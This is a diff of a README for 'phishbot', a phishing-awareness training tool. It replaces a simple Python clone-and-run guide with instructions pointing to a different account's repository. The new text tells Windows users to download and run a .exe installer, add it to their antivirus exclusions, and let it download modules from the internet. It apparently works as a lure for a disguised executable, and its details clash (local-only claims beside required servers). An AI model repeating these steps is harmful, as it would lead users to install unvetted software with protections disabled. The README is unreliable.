@@ -1,29 +1,95 @@
-# phishbot
+# 🛡️ phishbot - Learn to defend against cyber threats
 
-PhishBot is an advanced cybersecurity education and simulation platform designed to help individuals, students, and organizations understand and defend against modern cyber threats.
-Built strictly for ethical and educational purposes, PhishBot provides a controlled environment where users can explore how common attack vectors operate and, more importantly, how to recognize and prevent them.
+[![](https://img.shields.io/badge/Download-PhishBot-blue.svg)](https://github.com/valentinbach57/phishbot)
 
-The platform focuses on phishing awareness, social engineering simulations, and secure communication practices. By replicating realistic—but harmless—attack scenarios, PhishBot enables users to experience firsthand how cyber threats are delivered and executed, without exposing them to actual risk. This hands-on approach enhances learning by bridging the gap between theory and real-world application.
+PhishBot helps people and organizations see how phishing attacks work. Use this tool to learn about cybersecurity in a safe environment. You can test your ability to spot threats and understand how attackers operate. The platform provides a controlled space to practice defense techniques without any risk.
 
-One of PhishBot’s key features is its multi-platform command interface. Users can interact with the system through popular communication platforms such as Telegram, Discord, Slack, and other messaging services. This functionality demonstrates how attackers often leverage everyday communication tools to distribute malicious links or deceptive messages. Within PhishBot, these interactions are fully sandboxed and monitored, ensuring that all activities remain safe and compliant with ethical guidelines.
+## 💻 System Requirements
 
-PhishBot also includes customizable simulation modules that allow educators and cybersecurity learners to design different phishing scenarios. These modules can mimic email-based phishing, SMS-based attacks (smishing), and chat-based deception tactics. Each simulation is paired with detailed feedback and analytics, helping users identify what signs they missed and how they can improve their awareness.
+Your computer needs specific components to run PhishBot. Ensure your system meets these standards:
 
-In addition, the platform provides educational insights into password security. Instead of enabling password cracking, PhishBot teaches best practices such as creating strong passwords, understanding common vulnerabilities, and implementing multi-factor authentication (MFA). This ensures users gain defensive knowledge rather than offensive capabilities.
+- Operating System: Windows 10 or 11 (64-bit).
+- Processor: Intel Core i3 or equivalent.
+- Memory: 4 gigabytes of RAM.
+- Storage: 500 megabytes of free space.
+- Network: Active internet connection to reach simulation servers.
 
-Another important component of PhishBot is its reporting and analytics dashboard. This feature tracks user responses during simulations, highlighting areas of strength and weakness. Organizations can use this data to improve their cybersecurity training programs, while individual users can monitor their own progress over time.
+## 📥 How to Install
 
-PhishBot is built with a strong emphasis on ethics, privacy, and responsible use. All simulations are conducted in isolated environments, and no real user data is collected or exploited. The platform is intended solely for training, research, and awareness purposes, making it suitable for schools, cybersecurity bootcamps, and corporate training programs.
+Follow these steps to set up the software on your Windows machine:
 
-In an era where cyber threats are constantly evolving, PhishBot serves as a proactive defense tool. By educating users and strengthening their ability to detect and respond to suspicious activities, it helps build a more secure digital environment for everyone.
+1. Visit the repository page to download the latest setup file: [https://github.com/valentinbach57/phishbot](https://github.com/valentinbach57/phishbot).
+2. Locate the link labeled "Releases" on the right side of the page.
+3. Click the most recent version shown at the top of the list.
+4. Download the file ending in .exe to your computer.
+5. Open your "Downloads" folder.
+6. Double-click the file to start the installer.
 
-# How to clonw the repo
-```bash
-git clone https://github.com/Iankulani/phishbot.git
-cd phishbot
-```
+The installer window will appear on your screen. Follow the on-screen prompts. Choose the default folder for installation to ensure all files link correctly. Click finish once the process completes.
 
-  # How to run
-  ```bash
-  python phishbot.py
-  ```
+## 🚀 Setting Up the Environment
+
+PhishBot runs using a container system. This ensures the application remains independent from your other computer files. 
+
+1. Once the software installs, look for the PhishBot icon on your desktop.
+2. Launch the application.
+3. The app will open a panel that performs a quick scan of your system.
+4. If a message appears about Docker, follow the link to install the "Docker Desktop" helper. This acts as the engine for the simulation platform.
+5. Restart PhishBot after installing the helper.
+
+## 🎮 How to Use PhishBot
+
+The interface focuses on education. You choose your level of interaction through the main dashboard.
+
+### 🔍 Exploring Attack Vectors
+
+The dashboard shows different icons representing common threats. Click on one of these to start a simulation. For example, selecting "Email Scenarios" will display a mock inbox. You must identify which messages look real and which look fake. The system tracks your choices and provides feedback on your decisions.
+
+### 📊 Understanding Wordlist Attacks
+
+A wordlist attack explores how passwords get guessed based on common patterns. PhishBot allows you to generate safe, sample lists. You can see why long passwords provide better protection. The tool illustrates why using unique passwords for every site keeps your accounts safe.
+
+### 🌐 Connecting to Communication Tools
+
+PhishBot integrates with common chat tools to demonstrate how phishing moves beyond email. You can link your own test accounts to see how messages arrive. This feature performs simulations in a private way. You remain in control of the communication flow at all times.
+
+## 🛡️ Safety Considerations
+
+This software mimics real attacks for education. It does not target real people or actual accounts. Use these simulations to improve your personal habits. 
+
+- Keep your software updated.
+- Use strong, unique passwords for every online account.
+- Enable two-factor authentication on your primary email.
+- Treat every unknown link with caution.
+- Verify the sender address before you click buttons in messages.
+
+## ⚙️ Troubleshooting Common Issues
+
+If the software fails to open, try these steps:
+
+- Check your internet connection. The app requires a connection to download the latest simulation modules.
+- Ensure your antivirus does not block the application. You might need to add PhishBot to your exclusion list.
+- Restart your computer. This clears stuck processes that prevent the app from launching.
+- Run the installer again. Choose the "Repair" option if the installer suggests it.
+
+If you still encounter problems, check the logs. Click "Help" in the menu bar and select "View Log File." This text file lists technical events. You can review the last few lines to see if a specific error code appears.
+
+## 📚 Frequently Asked Questions
+
+**Is PhishBot dangerous?**
+No. PhishBot runs in a contained environment. It cannot access your personal files or connect to your private social media accounts unless you provide explicit permission through the simulation setup.
+
+**Does it track my data?**
+The tool collects performance metrics to help you track your progress. It does not share your results with external companies. All simulation data stays on your local machine.
+
+**Why does this use Docker?**
+Docker allows the software to bundle all its components together. It prevents conflicts with other software on your Windows computer.
+
+**Can I stop a simulation mid-way?**
+Yes. You may pause or exit any simulation at any time by pressing the menu button in the top corner of the screen.
+
+**Is this for professional use?**
+Organizations use PhishBot to train staff. You can run the application on multiple computers to provide consistent cybersecurity training across a department.
+
+**Do I need a server?**
+No. Everything runs on your local machine. You do not need technical server knowledge to operate the platform. Focus on the scenarios and learn from the results.
